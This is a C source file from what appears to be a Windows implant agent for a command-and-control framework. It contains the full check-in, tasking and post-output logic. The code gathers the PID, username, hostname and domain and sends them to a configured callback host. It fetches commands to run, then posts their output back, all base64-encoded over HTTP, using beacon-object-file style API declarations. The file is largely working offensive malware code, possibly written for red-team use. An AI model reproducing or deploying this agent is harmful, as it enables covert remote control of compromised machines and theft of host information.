#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"
#include "headers/HTTP.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI char * MSVCRT$strstr(const char *str, const char *strSearch);

/*
 *
 * CHECKIN LOGIC
 *
*/

char *generate_checkin_message(CheckinRequest *checkin) {
	// Allocate space and construct the serialized checkin message.
	
	int len = 1024;
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// Prepend the Payload UUID (36 bytes).
	for (int i = 0; i < 36; i++) {
		msg[offset] = checkin->payload_uuid[i];
		offset++;
	}
	
	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_CHECKIN);
	
	// 4 bytes for the PID.
	pack_uint(msg, &offset, checkin->pid);
	
	// Optional string fields.
	pack_string(msg, &offset, checkin->username);
	pack_string(msg, &offset, checkin->hostname);
	pack_string(msg, &offset, checkin->domain);
	
	// Base64-encode the serialized message.
	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_encode(msg, offset, encoded_msg);
	
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	return encoded_msg;
}

void parse_checkin_reply(HttpResponse *response, CheckinReply *reply) {
	// Base64 decode the response and unpack the fields into a struct.
	char *decoded_body = KERNEL32$VirtualAlloc(0, response->body_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_decode(response->body, response->body_size, decoded_body);
	
	int offset = 0;
	
	reply->action = unpack_char(decoded_body, &offset);
	
	reply->callback_uuid = unpack_str(decoded_body, &offset);
	reply->status = unpack_str(decoded_body, &offset);
	
	KERNEL32$VirtualFree(decoded_body, 0, MEM_RELEASE);
}

void free_checkin_request(CheckinRequest *request) {
	if (request->payload_uuid != NULL) { KERNEL32$VirtualFree(request->payload_uuid, 0, MEM_RELEASE); }
	if (request->username != NULL) { KERNEL32$VirtualFree(request->username, 0, MEM_RELEASE); }
	if (request->hostname != NULL) { KERNEL32$VirtualFree(request->hostname, 0, MEM_RELEASE); }
	if (request->domain != NULL) { KERNEL32$VirtualFree(request->domain, 0, MEM_RELEASE); }
}

void free_checkin_reply(CheckinReply *reply) {
	if (reply->callback_uuid != NULL) { KERNEL32$VirtualFree(reply->callback_uuid, 0, MEM_RELEASE); }
	if (reply->status != NULL) { KERNEL32$VirtualFree(reply->status, 0, MEM_RELEASE); }
}

void perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *reply) {
	// Generate checkin payload.
	CheckinRequest checkin = { 0 };
	checkin.payload_uuid = clone_str(state->params.payload_uuid);
	
	// Use the checkin PICO to gather basic situational awareness info, if possible.
	cap->CheckinPicoEntrypoint(&checkin);
	
	// Send checkin payload to C2 server.
	char *msg = generate_checkin_message(&checkin);
	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// If we get a 200 response code, parse the reply.
	if (response.status_code == 200) {
		parse_checkin_reply(&response, reply);
	}
	
	// Free unneeded allocations.
	free_checkin_request(&checkin);
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
}

/*
 *
 * TASKING LOGIC
 *
*/

char *generate_tasking_message(TaskingRequest *tasking) {
	// Allocate space and construct the serialized tasking message.
	
	int len = 1024;
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// Prepend the Callback UUID (36 bytes).
	for (int i = 0; i < 36; i++) {
		msg[offset] = tasking->callback_uuid[i];
		offset++;
	}
	
	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_TASKING);
	
	// 1 byte for the tasking size.
	pack_char(msg, &offset, tasking->tasking_size);
	
	// Base64-encode the serialized message.
	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_encode(msg, offset, encoded_msg);
	
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	return encoded_msg;
}

void parse_tasking_reply(HttpResponse *response, TaskingReply *reply) {
	// Base64 decode the response and unpack the fields into a struct.
	char *decoded_body = KERNEL32$VirtualAlloc(0, response->body_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_decode(response->body, response->body_size, decoded_body);
	
	int offset = 0;
	
	reply->action = unpack_char(decoded_body, &offset);	
	reply->tasking_size = unpack_char(decoded_body, &offset);
	
	size_t task_len = reply->tasking_size * sizeof(TaskInfo);
	reply->tasks = KERNEL32$VirtualAlloc(0, task_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0; i < reply->tasking_size; i++) {
		TaskInfo task = { 0 };
		
		task.id = unpack_str(decoded_body, &offset);
		task.command = unpack_str(decoded_body, &offset);
		task.parameters = unpack_str(decoded_body, &offset);
		task.timestamp = unpack_int(decoded_body, &offset);
		
		reply->tasks[i] = task;
	}
	
	KERNEL32$VirtualFree(decoded_body, 0, MEM_RELEASE);
}

void free_tasking_request(TaskingRequest *request) {
	if (request->callback_uuid != NULL) { KERNEL32$VirtualFree(request->callback_uuid, 0, MEM_RELEASE); }
}

void free_tasking_reply(TaskingReply *reply) {
	if (reply->tasks != NULL) {
		for (int i = 0; i < reply->tasking_size; i++) {
			KERNEL32$VirtualFree(reply->tasks[i].id, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(reply->tasks[i].command, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(reply->tasks[i].parameters, 0, MEM_RELEASE);
		}
		KERNEL32$VirtualFree(reply->tasks, 0, MEM_RELEASE);
	}
}

void perform_tasking(AgentState *state, TaskingReply *reply) {
	// Generate tasking payload.
	TaskingRequest tasking = { 0 };
	tasking.callback_uuid = clone_str(state->params.callback_uuid);
	tasking.tasking_size = 1;
	char *msg = generate_tasking_message(&tasking);
	
	// Send tasking payload to C2 server.
	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// If we get a 200 response code, parse the reply.
	if (response.status_code == 200) {
		parse_tasking_reply(&response, reply);
	}
	
	// Free unneeded allocations.
	free_tasking_request(&tasking);
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
}

/*
 *
 * POST LOGIC
 *
*/

char *generate_post_message(TaskPostRequest *post) {
	// Allocate space and construct the serialized post_response message.
	
	int len = 1024;
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// Prepend the Callback UUID (36 bytes).
	for (int i = 0; i < 36; i++) {
		msg[offset] = post->callback_uuid[i];
		offset++;
	}
	
	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_POST);

	// String fields.
	pack_string(msg, &offset, post->task_id);
	pack_string(msg, &offset, post->task_output);
	pack_string(msg, &offset, post->task_status);
	
	// Base64-encode the serialized message.
	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_encode(msg, offset, encoded_msg);
	
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	return encoded_msg;
}

void free_post_request(TaskPostRequest *request) {
	if (request->callback_uuid != NULL) { KERNEL32$VirtualFree(request->callback_uuid, 0, MEM_RELEASE); }
	if (request->task_id != NULL) { KERNEL32$VirtualFree(request->task_id, 0, MEM_RELEASE); }
	if (request->task_output != NULL) { KERNEL32$VirtualFree(request->task_output, 0, MEM_RELEASE); }
	if (request->task_status != NULL) { KERNEL32$VirtualFree(request->task_status, 0, MEM_RELEASE); }
}

void perform_post(AgentState *state, TaskInfo *task, char *output, char *status) {
	// Generate post payload.
	TaskPostRequest post = { 0 };
	post.callback_uuid = clone_str(state->params.callback_uuid);
	post.task_id = clone_str(task->id);
	post.task_output = output;
	post.task_status = status;
	char *msg = generate_post_message(&post);
	
	// Send post payload to C2 server.
	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// If we get a 200 response code, parse the reply.
	if (response.status_code == 200) {
		// TODO parse reply
		dprintf("GOT REPLY TO POST"); // DELETE ME TODO
	}
	
	// Free unneeded allocations.
	free_post_request(&post);
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
}
